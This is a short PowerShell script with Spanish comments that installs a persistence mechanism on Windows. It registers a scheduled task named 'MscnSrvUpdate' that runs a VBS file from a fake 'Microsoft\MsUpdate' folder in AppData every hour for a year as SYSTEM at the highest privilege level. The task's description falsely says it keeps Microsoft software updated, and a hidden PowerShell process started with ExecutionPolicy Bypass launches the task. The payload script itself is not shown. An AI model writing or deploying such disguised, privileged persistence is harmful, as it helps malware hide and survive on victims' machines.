# Eliminar una tarea existente llamada "MscnSrvUpdate"
Unregister-ScheduledTask -TaskName "MscnSrvUpdate" -Confirm:$false -ErrorAction SilentlyContinue

# Crear una acción para la tarea
$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "C:\Users\$env:USERNAME\AppData\Local\Microsoft\MsUpdate\Mscntask.vbs"

# Crear un disparador que se ejecute una vez y luego se repita cada hora durante un año
$trigger = New-ScheduledTaskTrigger -Once -At "00:00AM" -RepetitionInterval (New-TimeSpan -Minutes 60) -RepetitionDuration (New-TimeSpan -Days 365)

# Configuración de la tarea
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -StartWhenAvailable

# Registrar la tarea con la cuenta del sistema (privilegios elevados)
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "MscnSrvUpdate" `
    -Description "Mantiene actualizado el software de Microsoft. Si esta tarea está deshabilitada o detenida, el software de Microsoft no se actualizará." `
    -Settings $settings -User "SYSTEM" -RunLevel Highest | Out-Null


Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command 'Start-Sleep -Seconds 180; Start-ScheduledTask -TaskName \"MscnSrvUpdate\"'" -WindowStyle Hidden

